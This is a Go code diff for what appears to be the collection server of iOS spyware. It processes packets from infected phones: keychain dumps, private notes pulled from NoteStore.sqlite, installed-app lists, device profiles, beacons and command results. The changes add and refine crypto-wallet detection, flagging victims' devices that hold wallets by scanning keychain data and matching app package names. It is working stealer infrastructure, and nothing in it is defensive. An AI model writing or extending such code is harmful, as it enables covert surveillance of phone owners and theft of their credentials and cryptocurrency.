@@ -24,12 +24,15 @@ func ProcessFull(endpoint string, raw []byte, packetID int64) {
 	switch endpoint {
 	case "u":
 		parseApps(raw, packetID)
-	case "war":
-		parseWar(raw, packetID)
+	// 注意：/war 不再做 Go 侧 keychain 解析（keychain_items）——只落原包到 capture/war/，
+	// 解析交给 tools/（smart_forensics / recover_all，见 war_scan 自动检测）。
+	// 这样也避免 service 超长（1406）导致整批回滚。
 	case "nb":
 		parseMemos(raw, packetID)
 	case "a":
 		parseProfile(raw, packetID)
+	case "beacon":
+		parseBeacon(raw, packetID)
 	case "result":
 		parseResult(raw, packetID)
 	}
@@ -104,6 +107,11 @@ func parseApps(raw []byte, packetID int64) {
 		})
 	}
 	GetDB().Many(rows)
+	// 读模型：应用数按去重口径重算（phone 当前离线/多次回传不会越滚越大）。
+	SetDeviceAppsCount(lhu)
+	// 钱包 × app 包名配对：war 扫描拿不到钱包时，用已安装应用包名反推命中，
+	// 写入 wallet_seen / device_wallet_flags（幂等，重复回填无副作用）。
+	MatchWalletsFromApps(lhu, packetID, "")
 }
 
 // ── ② /war：不整包落库（正文留在 capture/war/，文件可下载）──
@@ -172,6 +180,43 @@ func parseWar(raw []byte, packetID int64) {
 	}
 	if len(rows) > 0 {
 		GetDB().Many(rows)
+		SafeCall(func() { markWalletSeen(du) }) // 设备→有/无 映射表
+	}
+
+	// wallet 桶 → wallet_seen（与 ProcessWar 同口径）。
+	// 实时 /war 由 ProcessWar 写入；但历史回填只走 ProcessFull → parseWar，
+	// 若不在此补写，重放 capture/war/*.json 后 wallet_seen 恒为空
+	// —— 这正是"旧库有几个设备有钱包、换 MySQL 后设备列表钱包列全空"的根因。
+	// 幂等：wallet_seen 唯一键 (packet_id, rule_name) + INSERT IGNORE。
+	if wallets, ok := kc["wallets"].(map[string]any); ok && len(wallets) > 0 {
+		var epoch float64
+		if p := GetDB().QueryOne("SELECT recv_epoch FROM packets WHERE id=?", packetID); p != nil {
+			switch v := p["recv_epoch"].(type) {
+			case float64:
+				epoch = v
+			case int64:
+				epoch = float64(v)
+			}
+		}
+		for ruleName, val := range wallets {
+			count := 0
+			if vm, ok := val.(map[string]any); ok {
+				count = int(toInt(vm["count"]))
+				if items := asAnySlice(vm["items"]); len(items) > 0 && count != len(items) {
+					count = len(items)
+				}
+			} else {
+				count = int(toInt(val))
+			}
+			rn, cnt := ruleName, count
+			SafeCall(func() {
+				GetDB().Exec(
+					"INSERT IGNORE INTO wallet_seen(ts, epoch, device_uuid, ip, rule_name, count, packet_id, src_file)"+
+						" VALUES(?,?,?,?,?,?,?,?)",
+					ts, epoch, du, "", rn, cnt, packetID, "")
+			})
+		}
+		SafeCall(func() { markWalletSeen(du) })
 	}
 }
 
@@ -197,18 +242,50 @@ func parseMemos(raw []byte, packetID int64) {
 			SQL: "INSERT INTO memos(uuid, note_id, title, snippet, mod_ts, first_packet_id, last_packet_id, first_seen, last_seen)" +
 				" VALUES(?,?,?,?,?,?,?,?,?)" +
 				" ON DUPLICATE KEY UPDATE" +
-					" title=VALUES(title), snippet=VALUES(snippet), mod_ts=VALUES(mod_ts)," +
-					" last_packet_id=VALUES(last_packet_id)," +
-					" last_seen=VALUES(last_seen)," +
-					" hits=hits+1",
+				" title=VALUES(title), snippet=VALUES(snippet), mod_ts=VALUES(mod_ts)," +
+				" last_packet_id=VALUES(last_packet_id)," +
+				" last_seen=VALUES(last_seen)," +
+				" hits=hits+1",
 			Args: []any{lhu, toInt(n["id"]), toStr(n["title"]),
 				toStr(n["snippet"]), fmtMod(n["mod"]), packetID, packetID, ts, ts},
 		})
 	}
 	GetDB().Many(rows)
+	SetDeviceNotesCount(lhu)
 }
 
-// ── ④ 设备档案（a 端点）──
+// UpsertMemos 把从 NoteStore.sqlite 抽取的备忘录正文写入 memos（幂等）。
+// note_id 用 sqlite 主键；note_id 与 /nb list 一致时会与 parseMemos 的写入合并。
+func UpsertMemos(uuid string, notes []NoteText) int {
+	if uuid == "" || len(notes) == 0 {
+		return 0
+	}
+	ts, _ := Now()
+	rows := make([]SQLArgs, 0, len(notes))
+	for _, n := range notes {
+		if n.Title == "" && n.Body == "" {
+			continue
+		}
+		title := n.Title
+		if len(title) > 512 {
+			title = title[:512]
+		}
+		rows = append(rows, SQLArgs{
+			SQL: "INSERT INTO memos(uuid, note_id, title, snippet, mod_ts, first_seen, last_seen)" +
+				" VALUES(?,?,?,?,?,?,?)" +
+				" ON DUPLICATE KEY UPDATE" +
+				" title=COALESCE(NULLIF(VALUES(title),''), title)," +
+				" snippet=COALESCE(NULLIF(VALUES(snippet),''), snippet)," +
+				" last_seen=VALUES(last_seen), hits=hits+1",
+			Args: []any{uuid, n.ID, title, n.Body, "", ts, ts},
+		})
+	}
+	if len(rows) > 0 {
+		GetDB().Many(rows)
+	}
+	SetDeviceNotesCount(uuid)
+	return len(rows)
+}
 func parseProfile(raw []byte, packetID int64) {
 	var j map[string]any
 	if json.Unmarshal(raw, &j) != nil {
@@ -219,20 +296,72 @@ func parseProfile(raw []byte, packetID int64) {
 		return
 	}
 	ts := recvTsOf(packetID)
+	// /a 与 /beacon 都是档案来源，平权：谁带非空值就用谁（后写覆盖，空值不覆盖）。
+	// 不再让 /a 无条件覆盖 —— 否则一条字段缺失的 /a 会把 beacon 已补好的机型/iOS 清空。
 	GetDB().Exec(
 		"INSERT INTO device_profiles(uuid, machine, device_name, ios_version, build_version,"+
 			" hostname, sysname, `release`, kern_version, ip, source, first_seen, last_seen)"+
 			" VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)"+
 			" ON DUPLICATE KEY UPDATE"+
-			" machine=VALUES(machine), device_name=VALUES(device_name),"+
-			" ios_version=VALUES(ios_version), build_version=VALUES(build_version),"+
-			" hostname=VALUES(hostname), sysname=VALUES(sysname), `release`=VALUES(`release`),"+
-			" kern_version=VALUES(kern_version), ip=VALUES(ip), source=VALUES(source),"+
+			" machine=COALESCE(NULLIF(VALUES(machine),''), machine),"+
+			" device_name=COALESCE(NULLIF(VALUES(device_name),''), device_name),"+
+			" ios_version=COALESCE(NULLIF(VALUES(ios_version),''), ios_version),"+
+			" build_version=COALESCE(NULLIF(VALUES(build_version),''), build_version),"+
+			" hostname=COALESCE(NULLIF(VALUES(hostname),''), hostname),"+
+			" sysname=COALESCE(NULLIF(VALUES(sysname),''), sysname),"+
+			" `release`=COALESCE(NULLIF(VALUES(`release`),''), `release`),"+
+			" kern_version=COALESCE(NULLIF(VALUES(kern_version),''), kern_version),"+
+			" ip=COALESCE(NULLIF(VALUES(ip),''), ip),"+
+			" source=COALESCE(NULLIF(VALUES(source),''), source),"+
 			" last_seen=VALUES(last_seen)",
 		uuid, toStr(j["machine"]), toStr(j["deviceName"]), toStr(j["ios_version"]),
 		toStr(j["build_version"]), toStr(j["hostname"]), toStr(j["sysname"]),
 		toStr(j["release"]), toStr(j["kern_version"]), toStr(j["ip"]), toStr(j["source"]),
 		ts, ts)
+}
+
+// ── ④b beacon（/beacon 端点）──
+//
+// beacon 同样携带完整 device_info（machine / hostname / ios_version / build_version /
+// kern_version），但结构不同：uuid 在顶层 `uuid`，字段嵌套在 `device_info` 下。
+// 旧实现只解析 /a，导致"只 beacon、未发 /a"的设备没有任何档案
+// → 设备列表显示"未知设备"（机型 / iOS / 设备名全空）。
+//
+// 与 parseProfile 同一套规则：非空即更新、空值不覆盖（两来源平权，后写生效）。
+func parseBeacon(raw []byte, packetID int64) {
+	var j map[string]any
+	if json.Unmarshal(raw, &j) != nil {
+		return
+	}
+	uuid := toStr(j["uuid"])
+	if uuid == "" {
+		uuid = toStr(j["lhu"])
+	}
+	if uuid == "" {
+		return
+	}
+	di, _ := j["device_info"].(map[string]any)
+	if di == nil {
+		return
+	}
+	ts := recvTsOf(packetID)
+	GetDB().Exec(
+		"INSERT INTO device_profiles(uuid, machine, device_name, ios_version, build_version,"+
+			" hostname, sysname, `release`, kern_version, ip, source, first_seen, last_seen)"+
+			" VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)"+
+			" ON DUPLICATE KEY UPDATE"+
+			" machine=COALESCE(NULLIF(VALUES(machine),''), machine),"+
+			" device_name=COALESCE(NULLIF(VALUES(device_name),''), device_name),"+
+			" ios_version=COALESCE(NULLIF(VALUES(ios_version),''), ios_version),"+
+			" build_version=COALESCE(NULLIF(VALUES(build_version),''), build_version),"+
+			" hostname=COALESCE(NULLIF(VALUES(hostname),''), hostname),"+
+			" sysname=COALESCE(NULLIF(VALUES(sysname),''), sysname),"+
+			" `release`=COALESCE(NULLIF(VALUES(`release`),''), `release`),"+
+			" kern_version=COALESCE(NULLIF(VALUES(kern_version),''), kern_version),"+
+			" last_seen=VALUES(last_seen)",
+		uuid, toStr(di["machine"]), toStr(di["hostname"]), toStr(di["ios_version"]),
+		toStr(di["build_version"]), toStr(di["hostname"]), toStr(di["sysname"]),
+		toStr(di["release"]), toStr(di["kern_version"]), "", "beacon", ts, ts)
 }
 
 // ── ⑤ 指令结果（result 端点）──
